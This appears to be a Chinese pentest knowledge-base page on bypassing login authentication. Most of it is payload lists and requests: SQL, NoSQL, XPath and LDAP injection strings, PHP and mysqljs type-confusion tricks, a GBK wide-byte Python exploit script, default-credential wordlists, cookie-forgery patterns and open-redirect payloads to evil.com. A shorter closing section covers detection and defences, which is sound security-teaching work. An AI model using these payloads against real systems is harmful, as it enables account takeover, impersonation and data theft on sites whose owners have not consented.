---
attack_surface: 认证/授权绕过, 注入类
impact: [身份伪造, 权限提升, 机密性破坏]
risk_level: 严重
prerequisites:
  - HTTP 协议基础
  - SQL / NoSQL / XPath / LDAP 基础语法
  - Burp Suite 或同类代理工具
related_techniques:
  - sql-injection
  - nosql-injection
  - xpath-injection
  - ldap-injection
  - account-takeover
  - open-redirect
difficulty: 入门-中级
tools:
  - Burp Suite
  - HTLogin
  - sqlmap
---

# Login Bypass — 登录绕过全矩阵

> 关联文档：[SQL Injection](../../Search/SQL%20Injection/README.md) · [NoSQL Injection](../../Search/NoSQL%20Injection/README.md) · [XPATH Injection](../../Search/XPATH%20Injection/README.md) · [LDAP Injection](../../Search/LDAP%20Injection/README.md) · [Open Redirect](../../Reflected%20Values/Open%20Redirect/README.md) · [Account Takeover](../Account%20Takeover/README.md) · [Default Credentials](../Account%20Takeover/README.md)

---

# 0x01 原理与分类

## 1.0 TL;DR

登录绕过是指攻击者在不具备合法凭据的情况下，利用**前端/后端逻辑分歧**、**输入处理异常**或**查询语言注入**突破认证系统。从最简单的注释检查到 SQL 注入到复杂的 LDAP 查询操纵，所有技术共享一个核心：**打破服务器对"你是谁"的判断逻辑**。

## 1.1 根本原理

任何登录系统本质是执行以下语义判断：

```
输入(用户名, 密码) → 查询存储 → 比较 → 返回认证决策
```

绕过点存在于这个链路的每个环节：

| 环节 | 绕过方式 | 核心思路 |
|------|---------|---------|
| **输入解析** | 参数类型污染、Content-Type 切换 | 改变服务器对输入的解析方式 |
| **查询构造** | SQL/NoSQL/XPath/LDAP 注入 | 在查询中注入永真逻辑 |
| **比较逻辑** | PHP 松散比较、NULL 绕过 | 利用语言特性扭曲比较结果 |
| **会话延续** | Remember Me 伪造、Token 猜测 | 绕过密码验证直接获取会话 |

## 1.2 攻击面分类与影响维度

| 维度 | 评估 |
|------|------|
| **攻击面** | 认证/授权绕过 (Authentication/Authorization Bypass)、注入类 (Injection) |
| **机密性破坏** | 是 — 读取任意用户数据、绕过访问控制 |
| **身份伪造** | 是 — 以他人身份登录 |
| **权限提升** | 是 — 从无权限到已认证用户，或直接以管理员身份进入 |
| **风险等级** | **严重** — 无需认证或仅需基本交互即可自动化利用 |

---

# 0x02 通用逻辑绕过

本章涵盖不依赖特定查询语言的认证绕过手段，适用于任何登录页面。

## 2.1 前端校验绕过

### 2.1.1 直接访问受保护页面

如果应用仅在登录页拦截未认证用户，而后端 API 未做二次校验，可直接请求目标页面。

```bash
# 直接请求管理页面
curl -s http://target.com/admin/dashboard

# 尝试常见路径
/admin /administrator /manager /console /dashboard /panel /cp /backend
```

### 2.1.2 检查页面源代码中的注释

开发者在 HTML 注释中遗留测试凭据或调试信息：

```html
<!-- test user: test / test123 -->
<!-- TODO: remove debug account admin:debug2024 -->
```

### 2.1.3 参数缺失/空值绕过

部分后端在参数为 NULL 或缺失时跳过验证：

```http
# 不发送 password 参数
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin

# 发送空参数值
username=admin&password=
```

## 2.2 参数处理异常

### 2.2.1 PHP 数组参数与松散比较

PHP 在比较字符串与数组时，会将数组转为 `Array` 字符串，可能产生意外的比较结果。同时，将输入转为数组可绕过 `strcmp()` 函数的正常比较路径。

```http
# 发送数组型参数（PHP 环境下 strcmp 失效）
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user[]=a&pwd=b

# 变体 — 仅污染单参数为数组
user=a&pwd[]=b

# 双数组
user[]=a&pwd[]=b
```

**原理**：PHP 的 `strcmp("input", "expected")` 在参数为数组时返回 `NULL`（非 `0`），而 `NULL == 0` 在松散比较下为 `true`，导致验证被跳过。

### 2.2.2 NodeJS `mysqljs` 参数污染

**受影响范围**：`mysqljs/mysql`（Node.js 最流行的 MySQL 包）及其 escape 函数族：`connection.escape()`、`mysql.escape()`、`pool.escape()`。

**根因**：`mysqljs/sqlstring` 库的 `SqlString.escape()` 对不同的 JavaScript 值类型采用不同的转义策略：

| 传入类型 | 转义结果 | 安全性 |
|----------|---------|--------|
| `String` | 安全转义（加引号 + 转义特殊字符） | ✓ 安全 |
| `Number` | 原样保留 | ✓ 安全 |
| `Boolean` | 转为 `true` / `false` | ⚠ 可能异常 |
| `Object` | 转为 `` `key` = 'val' `` 键值对（使用 quoted identifier） | ✗ 危险 |
| `Array` | 转为逗号分隔列表 | ⚠ 可能异常 |
| `undefined` / `null` | 转为 `NULL` | ✓ 安全 |

当 Express 框架解析 `password[password]=1` 时，将参数转为对象 `{password: 1}`，传入 `escape()` 后被转为 `` `password` = 1 ``。由于 `` `password` `` 是 quoted identifier（列引用）而非字符串值，在 SQL 中形成列自比较的恒真条件。

**URL 参数形式**：

```http
# 利用 NodeJS 参数解析差异
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[password]=1
```

**escape() 内部转换过程**：
```
输入: {password: 1}                       (JavaScript Object)
↓ escape() 处理
输出: `password` = 1                       (quoted identifier = number)
↓ 拼入 SQL
WHERE username='admin' AND `password` = 1
↓ MySQL 执行
WHERE username='admin' AND (password = password) = 1
                         └──────┬──────┘
                            恒为 1 (true)
                          1 = 1 → true
```

**JSON 变体**（当应用支持 JSON body 时）：

```json
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"password": 1}}
```

**更多攻击面**（受影响的类型不止 Object）：

```javascript
// Boolean 类型 — 可能绕过
{"username": "admin", "password": true}
// escape(true) → true → WHERE password=true

// Array 类型 — 可能产生异常行为
{"username": "admin", "password": [1, 2, 3]}
```

**重要前提**：
- 必须**知道有效用户名**（此绕过只影响密码验证）
- 服务端使用 `mysql.escape()` 或 `connection.escape()` 而非 prepared statements

**分层修复方案**：

```javascript
// 方案 1：启用 stringifyObjects（阻止 Object 类型，但 Array/Boolean 仍可绕过）
const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: '',
  database: 'test',
  stringifyObjects: true   // ← Object 转为字符串，避免 quoted identifier
});

// 方案 2（推荐）：类型检查 + stringifyObjects 双保险
app.post('/auth', (req, res) => {
  let username = req.body.username;
  let password = req.body.password;

  // 严格类型校验
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).send('Invalid input type');
  }

  connection.query(
    'SELECT * FROM accounts WHERE username = ? AND password = ?',
    [username, password],
    (error, results) => {
      // ...
    }
  );
});
```

## 2.3 内容类型操纵

### 2.3.1 切换为 JSON 提交

后端可能对不同 Content-Type 使用不同的解析器和校验逻辑：

```http
# 尝试发送 JSON body + boolean 值
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": true}

# 尝试各种 true 的 JSON 表示
{"username": "admin", "password": {"$gt": ""}}
```

### 2.3.2 GET 请求 + JSON body

当 POST 被禁用但 GET 支持 body 时：

```http
GET /login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username": "admin", "password": true}
```

## 2.4 凭据爆破策略

按以下优先级进行：

### 2.4.1 默认凭据

| 平台/技术 | 常用默认凭据 |
|-----------|------------|
| Tomcat | `tomcat:tomcat`, `admin:admin` |
| Jenkins | `admin:password` |
| WordPress | `admin:admin` / `admin:password` |
| phpMyAdmin | `root:` (空密码) |
| Drupal | `admin:admin` |
| Jira | `admin:admin` |
| MongoDB | `admin:admin` |
| PostgreSQL | `postgres:postgres` |

### 2.4.2 常见组合字典

```
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
root:password
test:test
guest:guest
user:user
administrator:administrator
admin:<空>
root:<空>
```

### 2.4.3 基于页面特征的字典生成

使用 Cewl 从目标网站提取词汇构建字典：

```bash
# 生成单词字典
cewl http://target.com -w target_words.txt

# 结合默认用户名+提取词汇
# 用 Burp Intruder 或 hydra 进行用户名+密码交叉爆破
```

---

# 0x03 SQL 注入登录绕过

## 3.1 注入原理

典型 SQL 登录查询：

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

SQL 注入登录绕过的核心是**注入永真条件或注释掉密码检查子句**，使 WHERE 条件恒为 true。

**绕过路径**：

| 策略 | 示例 | 效果 |
|------|------|------|
| **永真注入** | `' OR 1=1-- -` | `WHERE username='' OR 1=1-- -' AND password='...'` → 条件恒真 |
| **注释密码检查** | `admin'-- -` | `WHERE username='admin'-- -' AND password='...'` → 仅匹配用户名 |
| **UNION 注入** | `' UNION SELECT 'admin','hash'-- -` | 注入自定义结果集 |
| **GBK 宽字节绕过** | `%bf' OR 1=1-- -` | 绕过 `addslashes()` 对单引号的转义 |

## 3.2 基础 Payload 集合

以下 Payload 按策略分类，用户名和密码字段均可使用。推荐的测试策略：**用已知用户名作为 username，Payload 作为 password**。

### 3.2.1 基于注释的绕过（需已知用户名）

```
admin' --
admin' #
admin'/*
admin'-- -
admin') --
admin') #
admin')/*
admin") --
admin") #
admin")/*
```

### 3.2.2 基于永真条件的绕过

```
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
' OR 1=1-- -
') OR ('1'='1
') OR ('1'='1--
") OR ("1"="1
") OR ("1"="1--
```

### 3.2.3 常见变体（注释与永真混合）

```
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR 1=1--
admin' OR 1=1#
admin') OR ('1'='1
admin") OR ("1"="1
admin') OR '1'='1--
admin") OR "1"="1--
```

### 3.2.4 双 OR 逻辑（用户名和密码相同值时有效）

```
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
```

## 3.3 扩展 Payload 全集

以下来自于 `sql-login-bypass.md` 的精选 Payload 体系，按构造方式分类。

### 3.3.1 基础操作符变体

```
# 单引号系列
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
' or ''='
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
" or ""="
```

### 3.3.2 按注释符分类

```
# 短横线注释（--）
or true--
" or true--
' or true--
") or true--
') or true--
or 1=1--
or 1=1

# 井号注释（#）
or 1=1#
' OR 'x'='x'#;

# 块注释（/*）
or 1=1/*
' or '1'='1'/*
" or "1"="1"/*
') or ('1'='1'/*
") or ("1"="1"/*
```

### 3.3.3 UNION SELECT 类

```sql
# 配合已知哈希值插入（MD5 'Pass1234.' = 81dc9bdb52d04dc20036dbd8313ed055）
' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055

# SHA-1 哈希
' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220

# 带括号绕过 WAF
'UniON(SElecT(1),2)-- 2
'UniON(SElecT(1),2,3)-- 2
"UniON(SElecT(1),2)-- 2
"UniON(SElecT(1),2,3)-- 2

# 字段数探测
' UniON SElecT 1,2-- 2
' UniON SElecT 1,2,3-- 2
' UniON SElecT 1,2,3,4-- 2
' UniON SElecT 1,2,3,4,5-- 2
```

### 3.3.4 || 拼接逻辑系列（Oracle / PostgreSQL）

```
'||'2
'||2-- 2
'||'2'||'
'||2#
'||2/*
'||2||'
'||true-- 2
'||true#
'||'2'LiKE'2
'||'2'LiKE'2'-- 2
'||(2)LiKE(2)-- 2
```

### 3.3.5 GBK / 宽字节绕过

当 `'` 被 `addslashes()` 转义为 `\'`（0x5c27）时，利用 GBK 双字节字符 "吞掉" 反斜杠：

```
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' OR 1=1 -- 2
%bf' OR 1-- 2
%A8%27Or(1)-- 2
%A8%27) OR 1=1-- 2
%bf') OR 1=1 -- 2
%A8%27||1-- 2
%bf'||1-- 2
```

**Python 利用脚本**:

```python
import requests

url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {
    "login": chr(0xbf) + chr(0x27) + "OR 1=1 #",
    "password": "test"
}
r = requests.post(url, data=datas, cookies=cookies,
                  headers={'referrer': url})
print(r.text)
```

### 3.3.6 分隔符/括号/运算符全集

```
# 基础运算符绕过（无空格）
0'<2
0"<2

# 括号单注入前缀
')
")
')-- 2
')#
')/*
")-- 2
")#
")/*

# 算术运算符绕过
')-('
')&('
')^('
')*('
')=("
")-("
")&("
")^("
")*("
")=("

# 结合注释的运算符
'-''-- 2
'&''-- 2
'^''-- 2
'*''-- 2
'=''-- 2
"-""-- 2
"&""-- 2
"^""-- 2
"*""-- 2
"=""-- 2
```

### 3.3.7 OR / AND 变体含 LIMIT

```
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or a=a--
" or "a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' and substring(password/text(),1,1)='7
```

### 3.3.8 LIKe / 模糊匹配系列

```
like '%'
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
```

### 3.3.9 MySQL Magic Hash — ffifdyop

`ffifdyop` 是一个特殊的 Magic Hash 输入。当它被 MD5 哈希后，其原始二进制形式在解释为字符串时恰好形成 `'or'6<trash>` 这样的 SQL 永真条件：

```
MD5('ffifdyop') = 276f722736c95d99e921722cf9ed621c
原始二进制解释为字符串 → 'or'6�]��!r,��b
                             └── 闭合单引号，后接 OR 永真
```

在以下查询模式中可利用：

```sql
SELECT * FROM users WHERE username='admin' AND password=md5('$input')
```

当 `$input = ffifdyop`：
```sql
SELECT * FROM users WHERE username='admin' AND password=''or'6...'
```

用法：直接作为密码字段输入 `ffifdyop`。

---

# 0x04 NoSQL 注入登录绕过

## 4.1 注入原理

NoSQL 数据库（MongoDB、CouchDB 等）不使用 SQL 语法，但同样存在注入风险。核心绕过原理是**注入 MongoDB 操作符**（`$ne`、`$gt`、`$regex` 等），迫使查询条件恒真。

典型 MongoDB 查询：

```javascript
db.users.find({username: username, password: password})
```

当输入为 `{"$ne": ""}` 时：
```javascript
db.users.find({username: {"$ne": ""}, password: {"$ne": ""}})
// 匹配所有 username != "" 且 password != "" 的文档
// 返回第一个用户 → 绕过认证
```

## 4.2 Payload 集合

### 4.2.1 URL 参数形式（PHP 数组语法）

PHP 后端可以通过 `username[$ne]=1` 语法将参数转为 MongoDB 操作符：

```bash
# 不等于操作符（返回任意非空用户）
username[$ne]=toto&password[$ne]=toto

# 正则表达式操作符（匹配任意用户）
username[$regex]=.*&password[$regex]=.*

# EXISTS 操作符
username[$exists]=true&password[$exists]=true

# 等于操作符（指定用户名，绕过密码）
username[$eq]=admin&password[$ne]=1

# 小于/大于（可用于信息泄露和枚举）
username[$ne]=admin&pass[$lt]=s
username[$ne]=admin&pass[$gt]=s

# 不在列表中 (Nin)
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7

# 长度探测
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{25}

# 逐字符爆破
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=m.*
```

### 4.2.2 JSON body 形式

```json
# 不等于 null — 绕过密码验证
{"username": {"$ne": null}, "password": {"$ne": null}}

# 不等于具体值
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}

# 大于 undefined（始终为 false，不等于则恒真）
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}

# 正则匹配
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### 4.2.3 MongoDB `$where` 操作符注入

当应用使用 `$where` 操作符动态拼接 JavaScript 表达式时：

```javascript
// 服务端代码
query = { $where: `this.username == '${username}'` }
```

注入 Payload：

```
# 与 SQL 注入类似的永真逻辑
' || 1==1//
' || 1==1%00
admin' || 'a'=='a
```

---

# 0x05 XPath 注入登录绕过

## 5.1 注入原理

XPath 是 XML 文档的查询语言。当应用将用户输入直接拼入 XPath 表达式时，可注入永真条件。

典型登录 XPath：

```xpath
string(//user[name/text()='$user' and password/text()='$pass']/account/text())
```

## 5.2 Payload 集合

### 5.2.1 OR 逻辑注入（用户名和密码使用相同值）

```xpath
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
```

### 5.2.2 函数式注入（单字段盲注）

无需知道用户名，利用 XPath 函数选择第一个用户：

```xpath
# 选择 name 长度小于 10 的账户
'or string-length(name(.))<10 or'

# 选择 name 包含 'adm' 的第一个账户
'or contains(name,'adm') or'

# 选择当前节点包含 'adm' 的账户
'or contains(.,'adm') or'

# 选择位置为第 2 的账户
'or position()=2 or'

# 指定已知用户名（需知道用户名）
admin' or '
admin' or '1'='2
```

### 5.2.3 NULL 字节截断

```xpath
' or 1]%00
```

---

# 0x06 LDAP 注入登录绕过

## 6.1 注入原理

LDAP 查询使用波兰表示法（前缀表达式），过滤器格式：

```
(&(uid=$user)(userPassword=$pass))
```

注入的核心是**利用括号控制、通配符和逻辑操作符**破坏或绕过过滤逻辑。

LDAP 密码存储格式多样（clear/md5/smd5/sha1/sha/crypt），注入 payload 独立于密码格式工作。

## 6.2 Payload 集合

### 6.2.1 通配符注入

LDAP 中 `*` 匹配任意内容：

```
# 用户名和密码均使用 * — 匹配所有条目
user=*
password=*
```

生成过滤器：`(&(user=*)(password=*))`

### 6.2.2 逻辑操作符注入

```
# 闭合 & 后注入永真
user=*)(&
password=*)(&
→ (&(user=*)(&)(password=*)(&))

# 注入 OR 逻辑
user=*)(|(&
pass=pwd)
→ (&(user=*)(|(&)(pass=pwd))

# 注入 OR + 密码自匹配
user=*)(|(password=*
password=test)
→ (&(user=*)(|(password=*)(password=test))

# NULL 字节截断（截断后续过滤器）
user=*))%00
pass=any
→ (&(user=*))%00 → 后续全部被截断

# 已知用户名的精确认证
user=admin)(!(&(|
pass=any))
→ (&(uid=admin)(!(&(|)(webpassword=any))))
# (|) = FALSE, !FALSE = TRUE → 用户匹配且密码检查被绕过

# 仅闭合
user=admin)(&)
password=pwd
→ (&(user=admin)(&))(password=pwd)
```

### 6.2.3 综合 Payload 列表

```
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```

---

# 0x07 会话与后登录利用

## 7.1 Remember Me 滥用

"记住我" 功能常将用户标识存储在持久化 Cookie 中。检查以下利用点：

### 7.1.1 实现检查清单

- [ ] Cookie 中存储的是否为**可预测的值**（如 user ID、base64 编码的用户名）？
- [ ] Token 是否有**有效期**验证？
- [ ] Token 是否可通过**已知信息**（用户名、邮箱）生成？
- [ ] Token 在**服务器端是否有对应的失效机制**？

### 7.1.2 常见脆弱模式

| 模式 | Payload | 利用 |
|------|---------|------|
| Cookie 存 base64(username) | `Set-Cookie: remember=YWRtaW4=` | 修改 base64 值为目标用户 |
| Cookie 存 user_id | `Set-Cookie: uid=1` | 尝试递增/递减 uid |
| Cookie 存明文凭据 | `Set-Cookie: auth=admin:hash` | 直接复用 |
| Token 使用弱签名 | JWT 无签名 / MD5 签名 | 伪造 Token |

## 7.2 登录后重定向劫持

登录后页面通常通过 `redirect` 参数跳转回原始请求页面：

```
/login?redirect=/dashboard
```

利用此参数构造 Open Redirect：

```http
GET /login?redirect=https://evil.com/phishing HTTP/1.1
Host: target.com
```

**利用价值**：
- 钓鱼：诱导用户点击后重定向到伪造登录页，窃取凭据
- 窃取 URL 中的 token/授权码：在 OAuth 流程中，`redirect` 参数可能泄露 authorization code
- 绕过同源限制：在某些 SSO 实现中触发 token 泄露

检测方法：
```
/login?redirect=https://evil.com
/login?redirect=//evil.com
/login?redirect=https:evil.com
/login?redirect=javascript:alert(1)
```

---

# 0x08 检测与防御

## 8.1 攻击检测方法

### 8.1.1 手动测试流程

1. **基线建立**：使用正常凭据登录，记录响应特征（状态码、body 长度、响应时间、Set-Cookie 头）
2. **通用逻辑测试**（`0x02`）：
   - 空参数 → 数组参数 → JSON Content-Type → 参数污染
3. **注入测试**（`0x03`-`0x06`）：
   - 单引号 `'` / 双引号 `"`
   - 注入永真条件
   - 注入注释符（`--` / `#` / `/*` / `%00`）
4. **用户名枚举**：利用错误信息差异（"密码错误" vs "用户不存在"）枚举有效用户名
5. **浏览器自动填充检查**：检查密码表单的 `autocomplete` 属性 — `<input autocomplete="off">` 表示禁用，但 `<input>` 无此属性则浏览器可能保留凭据
6. **自动化测试**：使用 HTLogin 或 Burp Intruder 批量测试 Payload 列表

### 8.1.2 识别响应差异

| 信号 | 含义 |
|------|------|
| 成功登录 + 302 重定向 | 绕过成功 |
| 错误信息变化（"密码错误" → "用户不存在"） | 用户名枚举点 |
| 响应长度显著变化 | 可能返回了不同用户的数据 |
| Set-Cookie 值变化 | 可能已获得有效会话 |
| 响应时间异常（时间盲注） | 注入导致的延迟 |

## 8.2 分层防御策略

### 8.2.1 应用层

```
第一层 — 输入验证
├── 参数类型白名单（拒绝数组传入标量字段）
├── 拒绝任何包含 SQL/NoSQL/LDAP 操作符的字段名
├── 严格字符串验证（正则白名单，而非黑名单）
└── Content-Type 与参数格式一致性校验

第二层 — 查询安全
├── 参数化查询 / Prepared Statements（SQL）
├── ORM 框架安全使用（检查 stringifyObjects 等选项）
├── LDAP: 用户输入必须 escape 特殊字符 * ( ) \ NUL
├── XPath: 使用变量绑定而非字符串拼接
└── NoSQL: 使用 $eq 显式包装用户输入，禁止裸对象传入

第三层 — 认证逻辑
├── 服务器端会话管理（不依赖前端校验）
├── 验证 URL 后登录重定向（白名单校验 redirect 参数）
├── Remember Me Token 使用 CSPRNG + 服务端失效机制
└── 失败登录频率限制 + 账户锁定策略
```

### 8.2.2 基础设施层

```
├── WAF 规则：检测请求中的 SQL/NoSQL/XPath/LDAP 注入特征
├── 参数值异常告警：数组传入、Content-Type 异常
├── 登录失败率监控：异常突发峰值
└── RASP：运行时 SQL/查询语句审计
```

### 8.2.3 PHP 特定防御

```php
// 危险：松散比较
if (strcmp($input, $expected) == 0) { ... }  // 数组输入可绕过

// 安全：严格比较
if (strcmp($input, $expected) === 0) { ... } // === 阻止 NULL == 0

// 安全：先验证参数类型
if (!is_string($input) || !is_string($expected)) {
    die('Invalid input type');
}
if (strcmp($input, $expected) !== 0) { ... }
```

---

## 参考资料

- [Hacktricks — Login Bypass](https://book.hacktricks.wiki/en/pentesting-web/login-bypass/index.html)
- [Hacktricks — SQL Injection Authentication Bypass](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html#authentication-bypass)
- [Hacktricks — NoSQL Injection](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
- [Hacktricks — XPath Injection](https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html)
- [Hacktricks — LDAP Injection](https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html)
- [Finding an unseen SQL Injection — Flatt Security (Medium)](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)
- [HTLogin — Automated Login Bypass Tool](https://github.com/akinerkisa/HTLogin)
- [PortSwigger — Authentication](https://portswigger.net/web-security/authentication)
